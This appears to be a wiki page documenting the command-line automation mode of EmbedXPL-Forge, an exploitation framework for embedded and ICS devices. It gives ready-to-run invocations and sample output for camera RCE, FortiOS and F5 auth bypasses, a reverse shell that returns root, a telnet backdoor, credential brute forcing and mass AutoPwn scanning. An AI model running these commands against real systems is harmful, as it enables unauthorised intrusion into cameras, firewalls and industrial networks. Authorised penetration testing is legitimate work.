# Non-Interactive Mode

**Language:** English (en-US) | **pt-BR:** [../pt-BR/04-modo-nao-interativo.md](../pt-BR/04-modo-nao-interativo.md)

---

## Overview

Non-interactive mode executes a module or scan from the command line without opening the interactive shell. It is designed for **automation**, CI/CD pipelines, cron-scheduled assessments, and one-shot command-line exploitation.

> **Note:** Non-interactive `-m` mode always calls `run()` directly. It does not call `check()` first. To run `check()` only, use the interactive shell.

All three entry points are equivalent:

```bash
embedxpl -m <path> -s "<opt> <val>"      # pip entry point (recommended)
exf      -m <path> -s "<opt> <val>"      # alias
python -m embedxpl -m <path> -s "<opt> <val>"   # module invocation
python exf.py      -m <path> -s "<opt> <val>"   # legacy bootstrap
```

---

## Complete flag reference

| Flag | Long form | Type | Required | Description |
|------|-----------|------|----------|-------------|
| `-h` | `--help` | — | No | Print usage help and exit |
| `-m` | `--module` | string | Yes* | Module path, e.g. `exploits/cameras/hikvision/rtsp_rce_cve_2021_36260` |
| `-s` | `--set` | string | No | Set a module option; repeat for each option (`"option value"` format) |
| `-T` | `--targets` | string (file path) | No | Multi-target scan from file; each line is an IP or CIDR |
| `--infra` | — | string | No | Infrastructure type: `wizard`, `ot`, `it`, `soho`, or custom key |
| `--context` | — | string | No | Operational context for infra mode (e.g. `ics`, `scada`, `dmz`) |
| `--target` | — | string | No | IP address or CIDR range for the infra scan plan |

\* `-m` is required unless using `-T`, `--infra wizard`, or `-h`.

---

## `-h` / `--help` — usage help

```bash
embedxpl -h
```

**Terminal session:**

```text
$ embedxpl -h
[*] embedxpl -m <module> -s "<option> <value>"
       embedxpl -T <targets.txt>  (multi-target scan from file)
       embedxpl --infra ot --context ics --target 192.168.1.0/24
       embedxpl --infra wizard  (interactive infrastructure selection)
```

---

## `-m` / `--module` — run a single module

```bash
embedxpl -m <module_path> [-s "<option> <value>"] ...
```

**Terminal session — basic exploit:**

```bash
$ embedxpl -m exploits/cameras/hikvision/rtsp_rce_cve_2021_36260 \
    -s "target 192.168.1.100" \
    -s "port 80"
```

```text
[*] Running module <...rtsp_rce_cve_2021_36260.Exploit object>...
[*] Checking if 192.168.1.100:80 is a Hikvision device...
[*] Attempting CVE-2021-36260 RCE on 192.168.1.100...
[*] Response HTTP 400: <?xml version="1.0"...
[+] CVE-2021-36260: Payload delivered to 192.168.1.100:80. Monitor for callback.
[!] Verify execution via OOB (e.g., Burp Collaborator or Interactsh).
```

**Error — no module specified:**

```text
$ embedxpl
[-] A module is required when running non-interactively
```

**Error — unknown module:**

```text
$ embedxpl -m exploits/cameras/hikvision/does_not_exist
[-] ImportError: No module named 'embedxpl.modules.exploits.cameras.hikvision.does_not_exist'
```

---

## `-s` / `--set` — set module options

Each `-s` flag takes a **single quoted string** containing `"option_name value"`.

**Correct format:**

```bash
# One option per -s flag:
embedxpl -m exploits/cameras/dahua/cctv_rce_cve_2021_36260 \
    -s "target 192.168.1.50" \
    -s "port 80"
```

**Incorrect format (do not do this):**

```bash
# WRONG — multiple options in one -s:
embedxpl -m ... -s "target 192.168.1.50 port 80"
```

**Values with spaces — quote the entire `-s` argument:**

```bash
embedxpl -m exploits/printers/generic/pjl_info_disclosure \
    -s "target 10.0.0.50" \
    -s "cmd @PJL INFO ID"
```

---

## `-T` / `--targets` — multi-target scan from file

```bash
embedxpl -T <targets_file>
```

**Parameters:**

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `targets_file` | string (file path) | Yes | — | Readable file path | Path to file with IPs/CIDRs, one per line |

Targets file format (one entry per line; blank lines and `#` comments are skipped):

```text
# Datacenter segment
192.168.1.1
192.168.1.2
10.0.0.0/24
# SOHO segment
172.16.0.1
```

**Terminal session:**

```text
$ embedxpl -T /tmp/targets.txt
[*] Multi-target scan from file: /tmp/targets.txt
[*] [192.168.1.1] [scanning] Starting ARP/ICMP sweep
[*] [192.168.1.1] [fingerprint] Probing 192.168.1.1...
[+] [192.168.1.1] done — 4 modules matched
[*] [192.168.1.2] [scanning] Starting ARP/ICMP sweep
[*] [192.168.1.2] [fingerprint] Probing 192.168.1.2...
[+] [192.168.1.2] done — 2 modules matched
[*] [10.0.0.0/24] [scanning] Scanning 254 hosts...
[*] [10.0.0.0/24] [arp] 10.0.0.1 responding
[*] [10.0.0.0/24] [arp] 10.0.0.5 responding
[+] [10.0.0.0/24] done — 6 total host(s) found

Scan complete — 3 target(s), 8 total host(s) found
  192.168.1.1 — 1 host(s):
    192.168.1.1: Huawei EG8145X6 [80,443] 78% — 4 modules
  192.168.1.2 — 1 host(s):
    192.168.1.2: ZTE H168N [80,23] 65% — 2 modules
  10.0.0.0/24 — 6 host(s):
    10.0.0.1: TP-Link Archer C6 [80,443] 82% — 5 modules
    ...
```

**Error — file not found:**

```text
$ embedxpl -T /tmp/nonexistent.txt
[-] Targets file not found: /tmp/nonexistent.txt
```

**Parallelism:** Up to 4 CIDR ranges are scanned in parallel (default `max_file_workers=4`). Individual IPs are processed sequentially within each worker. Results print as they complete.

---

## `--infra wizard` — interactive infrastructure wizard

```bash
embedxpl --infra wizard
```

Launches an interactive numbered menu prompting the user to select infrastructure type and operational context. At the end it prints the resolved module list without executing them.

**Terminal session:**

```text
$ embedxpl --infra wizard

Select infrastructure type:
  1. ot    (Operational Technology / ICS/SCADA)
  2. it    (Enterprise IT)
  3. soho  (Small Office / Home Office)
  4. iot   (IoT/Embedded Edge)
Choice: 1

Select context for 'ot':
  1. ics   (Industrial Control Systems)
  2. scada (SCADA/HMI)
  3. plc   (PLC-focused)
Choice: 1

[*] Scan plan ready: 18 modules for ot/ics
```

Cancelled with Ctrl+C:

```text
^C
[!] Wizard cancelled by user.
```

---

## `--infra` + `--context` + `--target` — infrastructure scan plan

```bash
embedxpl --infra <type> --context <context> --target <ip_or_cidr>
```

**Parameters:**

| Flag | Type | Required | Description |
|------|------|----------|-------------|
| `--infra` | string | Yes | Infrastructure type key (e.g. `ot`, `it`, `soho`) |
| `--context` | string | No | Operational context within the infra type (e.g. `ics`) |
| `--target` | string | No | IP or CIDR range |

**Terminal session — OT/ICS scan plan:**

```text
$ embedxpl --infra ot --context ics --target 192.168.100.0/24

[*] OT/ICS scan plan for 192.168.100.0/24:
    18 modules selected

    Scan plan:
      scanners/ics/modbus_scanner
      scanners/ics/bacnet_scanner
      scanners/ics/s7_comm_scanner
      scanners/ics/enip_scanner
      scanners/ics/dnp3_scanner
      exploits/ics/...
      ...

[*] Use -m <module> -s "target 192.168.100.0/24" to run individual modules.
[*] Or launch interactive shell and type 'use <module>' to explore.
```

**Terminal session — unknown infra type:**

```text
$ embedxpl --infra unknown_type --context ics
[-] Unknown infra type 'unknown_type'. Valid: ot, it, soho, iot
```

**Terminal session — valid infra, no context (lists available contexts):**

```text
$ embedxpl --infra ot
[*] Available contexts for --infra ot:
  ics
  scada
  plc
  historian
```

---

## Complete usage examples

### Camera exploit (Hikvision CVE-2021-36260)

```bash
embedxpl \
    -m exploits/cameras/hikvision/rtsp_rce_cve_2021_36260 \
    -s "target 192.168.1.100" \
    -s "port 80" \
    -s "command whoami"
```

```text
[*] Running module ...
[*] Checking 192.168.1.100:80...
[*] Attempting CVE-2021-36260 RCE...
[*] Response HTTP 400: <?xml version="1.0"...
[+] CVE-2021-36260: Payload delivered to 192.168.1.100:80. Monitor for callback.
```

### Camera exploit (Dahua CVE-2021-36260)

```bash
embedxpl \
    -m exploits/cameras/dahua/cctv_rce_cve_2021_36260 \
    -s "target 192.168.1.50"
```

```text
[*] Running module ...
[*] Probing CVE-2021-36260 indicators at 192.168.1.50...
[+] [CRITICAL] configManager.cgi accessible without auth — CVE-2021-36260 likely exploitable
[*] Response preview: Network.Eth0.IPVersion=IPv4...
[*] Full exploitation requires sending crafted mutate payload to configManager.cgi action=setConfig
```

### Router credential test

```bash
embedxpl \
    -m creds/routers/dlink/telnet_default_creds \
    -s "target 192.168.1.1"
```

```text
[*] Running module ...
[*] Trying admin:admin on 192.168.1.1:23
[-] FAIL: admin:admin
[*] Trying admin:1234 on 192.168.1.1:23
[+] SUCCESS: admin:1234 — telnet shell obtained
```

### Firewall auth bypass (FortiOS CVE-2022-40684)

```bash
embedxpl \
    -m exploits/firewalls/fortinet/fortios_auth_bypass_cve_2022_40684 \
    -s "target 10.0.0.5"
```

```text
[*] Running module ...
[*] FortiOS at 10.0.0.5:443 -- auth bypass phase
[+] Bypass active with header variant
[*] Configuration dump...
[+] Admin Accounts: {"results": [{"name": "admin", "type": "administrator"}]}
```

### Firewall auth bypass with reverse shell staging

```bash
embedxpl \
    -m exploits/firewalls/fortinet/fortios_auth_bypass_cve_2022_40684 \
    -s "target 10.0.0.5" \
    -s "lhost 10.0.0.99" \
    -s "lport 4444" \
    -s "shell_type python"
```

```text
[*] Running module ...
[*] FortiOS at 10.0.0.5:443 -- auth bypass active
[*] Phase 5 - Shell staging (type: python)...
[shell] Listening on 0.0.0.0:4444 (timeout 60s) -- PTY mode
[shell] Shell connected from 10.0.0.5:52241 -- entering PTY interaction
[shell] PTY shell active. Ctrl+] to detach, Ctrl+D to close.
$ id
uid=0(root) gid=0(root)
```

### Herospeed NVR unauthenticated account enumeration

```bash
embedxpl \
    -m exploits/cameras/herospeed/herospeed_nvr_unauth_account_enum \
    -s "target 192.168.1.60"
```

```text
[*] Running module ...
[*] Probing Herospeed/Longsee NVR at 192.168.1.60...
[+] Salt: a3f2b9c1d4e0f...
[+] Challenge: 7d2e1a9b...
[+] SessionID: 4f8c2e1b...
[+] Accounts found: admin, operator, viewer
[+] HSLS-2026-001 confirmed — unauthenticated account enumeration successful
```

### Herospeed NVR telnet backdoor

```bash
embedxpl \
    -m exploits/cameras/herospeed/herospeed_nvr_telnet_safecode_backdoor \
    -s "target 192.168.1.60" \
    -s "mac 2C6F512D50DD"
```

```text
[*] Running module ...
[*] Computing SafeCode from MAC 2C6F512D50DD...
[+] SafeCode: 3A7F2D1E9C4B
[*] Connecting telnet to 192.168.1.60:23...
[+] Login successful (root / SafeCode)
[+] Root shell obtained: cxlinux
```

### F5 BIG-IP REST API RCE (CVE-2022-1388)

```bash
embedxpl \
    -m exploits/appliances/f5/bigip_icontrol_rest_rce_cve_2022_1388 \
    -s "target 10.1.1.10" \
    -s "command id"
```

```text
[*] Running module ...
[*] Sending CVE-2022-1388 request to 10.1.1.10:443...
[+] Authentication bypassed
[*] Executing command: id
[+] uid=0(root) gid=0(root) groups=0(root)
```

### Supermicro IPMI auth bypass (CVE-2013-4786)

```bash
embedxpl \
    -m exploits/bmc/supermicro/ipmi_auth_bypass_cve_2013_4786 \
    -s "target 10.0.1.5"
```

```text
[*] Running module ...
[*] Sending IPMI 2.0 RAKP auth bypass probe to 10.0.1.5:623...
[+] IPMI hash obtained: $rakp$...
[+] CVE-2013-4786 confirmed — crack offline with hashcat -m 7300
```

### SNMP community bruteforce

```bash
embedxpl \
    -m generic/snmp/snmp_bruteforce \
    -s "target 192.168.1.1"
```

```text
[*] Running module ...
[*] Testing community string: public
[+] VALID community: public (SNMPv1 get-request succeeded)
[*] Testing community string: private
[+] VALID community: private
[*] Testing community string: admin
[-] FAIL: admin
```

### AutoPwn full scan on a single host

```bash
embedxpl \
    -m scanners/autopwn \
    -s "target 192.168.1.1" \
    -s "timing_template T4" \
    -s "vendor any"
```

```text
[*] AutoPwn timing profiles (Nmap-style -T0..-T5):
...
[*] AutoPwn timing template T4 (aggressive) active: threads=16, confirm_passes=1, inconclusive_retries=0, delay=0.0s
[*] 192.168.1.1 Starting vulnerability check...
[+] 192.168.1.1:80 http telnet_default_creds is vulnerable
[+] 192.168.1.1:80 http dir_300_600_rce is vulnerable
[-] 192.168.1.1:22 ssh ssh_default_creds is not vulnerable
...
[+] 192.168.1.1 Device is vulnerable:
┌───────────────┬──────┬──────────┬───────────────────────────────┐
│ Target        │ Port │ Service  │ Exploit                       │
├───────────────┼──────┼──────────┼───────────────────────────────┤
│ 192.168.1.1   │ 80   │ http     │ telnet_default_creds          │
│ 192.168.1.1   │ 80   │ http     │ dir_300_600_rce               │
└───────────────┴──────┴──────────┴───────────────────────────────┘
```

---

## Exit codes

| Code | Meaning |
|------|---------|
| `0` | Module ran to completion (does NOT imply the target is vulnerable) |
| `1` | Error: stdin not a TTY, missing module, import failure, or usage error |

> **Important:** Exit code `0` means the module executed without a fatal Python exception. It does not mean the target was confirmed vulnerable. Parse `[+]` prefixed lines in stdout to determine vulnerability status.

---

## Automation tips

1. **Parse `[+]` lines for positives:** `embedxpl -m ... 2>&1 | grep '^\[+\]'`
2. **Log full output:** `embedxpl -m ... 2>&1 | tee /tmp/scan-$(date +%Y%m%d).log`
3. **Parallel multi-module scans:** invoke multiple processes, each with a different `-m`, against a shared targets file.
4. **Use `-T` for batch host scanning:** create a CIDR file and let EmbedXPL-Forge manage parallelism with `max_file_workers=4`.
5. **Chain with jq for structured output:** the `sessions export <ip>` command emits JSON suitable for jq post-processing.
6. **Set global state via shell before automation:** open the interactive shell, use `setg target <ip>`, then exit and run non-interactive modules — global opts carry over via the session file.


[Wiki hub](../README.md)
